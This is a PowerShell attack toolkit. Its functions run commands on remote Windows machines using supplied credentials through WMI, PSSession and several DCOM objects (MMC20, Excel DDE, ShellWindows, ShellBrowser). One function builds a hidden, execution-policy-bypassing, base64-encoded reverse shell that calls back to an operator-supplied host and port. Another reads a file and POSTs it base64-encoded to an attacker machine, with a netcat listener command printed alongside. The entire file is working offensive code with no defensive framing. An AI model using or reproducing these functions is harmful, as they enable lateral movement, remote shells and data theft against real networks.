Function Create-CredentialObject{

	param(
		[string]$Username,
		[string]$Password
	)

	$sec_pass = ConvertTo-SecureString $Password -AsPlaintext -Force
	$cred = New-Object System.Management.Automation.PSCredential $Username,$sec_pass
	return $cred

}

Function Encode-Command{

	param(
		[string]$Command
	)

	$enc_command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
	$full_payload = "powershell -nop -ep bypass -w hidden -e $enc_command"
	return $full_payload

}

function Execute-WMICommand {

	param(
		[string]$Username,
		[string]$Password,
		[string]$Command,
		[string]$Target,
		[switch]$GeneratePayload

	)

	#Create PSCredential
	$cred = Create-CredentialObject -Username $Username -Password $Password

	#Create CIM Session Object
	$options = New-CimSessionOption -Protocol DCOM
	$session = New-CimSession -ComputerName $Target -Credential $cred -SessionOption $options

	#Check if need to Generate Shell

	if ($GeneratePayload -and $Command -eq ""){

		$Command = Generate-PowerShellPayload

	}
	elseif (!$GeneratePayload -and $Command -eq ""){

		Write-Host "Please enter a command to be run on target: `"$Target`"" -ForegroundColor Red
		return

	}

	#Execute Command
	Invoke-CimMethod -CimSession $session -ClassName Win32_Process -Method Create -Arguments @{CommandLine=$Command}

}

Function Create-PSSession{

	param(
		
		$Username,
		$Password,
		$Target

	)

	#Create PSCredential
	$cred = Create-CredentialObject -Username $Username -Password $Password

	#Create PSSession
	$session = New-PSSession -ComputerName $target -Credential $cred

	return $session

}

function Generate-PowerShellPayload{

	$lHost = Read-Host "Enter LHOST"
	$lPort = Read-Host "Enter LPORT"

	$payload = '$client = New-Object System.Net.Sockets.TCPClient("' + $lHost +'",' + $lPort + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

	$encodedCommand = Encode-Command($payload)

	return $encodedCommand

}

Function Execute-DCOMCommand {

	param(

		[string]$Target,
		[string]$Command,
		[switch]$GeneratePayload,
		[string]$Type = "MMC"

	)

	if ($GeneratePayload -and $Command -eq ""){

		$Command = Generate-PowerShellPayload

	}

	if (!$GeneratePayload -and $Command -eq ""){

		Write-Host "Please enter a command to run on target `"$Target`"" -ForegroundColor Red 

	}

	switch($Type){

		"MMC" {
			#Create MMC 2.0 Application 
			$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgId("MMC20.Application.1",$Target))
			#Execute the command against target
			$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"$Command","7")
		}
		"Excel" {
			#Create Excel Application
			$dcom_excel = [System.Activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application",$Target))
			#Execute command against target
			#Application name limited to 8 characters. Application parameters do not have this limitation
			$dcom_excel.DisplayAlerts = $false
			$dcom_excel.DDEInitiate("cmd","cmd /c $command")
		}

		"Shell" {
			#Create ShellWindows Object
			#Only Usable if Windows Explorer windows is open. If no window open, nothing is returned. 
			$dcom_shell = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39",$Target))
			#Execute command against target
			$dcom_shell[0].Document.Application.ShellExecute($Command)
		}
		"ShellBrowser" {

			#Create ShellBrowser Object
			$dcom_brows = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8445-00A0C91F3880", $Target))
			#Execute command on target
			#Cannot be used on Windows 7 or prior
			$dcom_brows.Document.Application.ShellExecute($Command)

		}
	}

}

Function Exfil-Data{

	param(
		$Path,
		$Dest
	)

	#Print Warning
	Write-Host "Make sure to start a netcat listener!"
	Write-Host "nc -nvlp 8000 | tee data.b64" -ForegroundColor Cyan
	Write-Host "Data can be decoded with: tail -1 data.b64 | base64 -d > data.bin"

	#Convert data to Base64
	$data = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($Path))

	#Transfer all data to destination via IWR
	iwr http://$Dest`:8000/data.raw -Method POST -Body $data

}
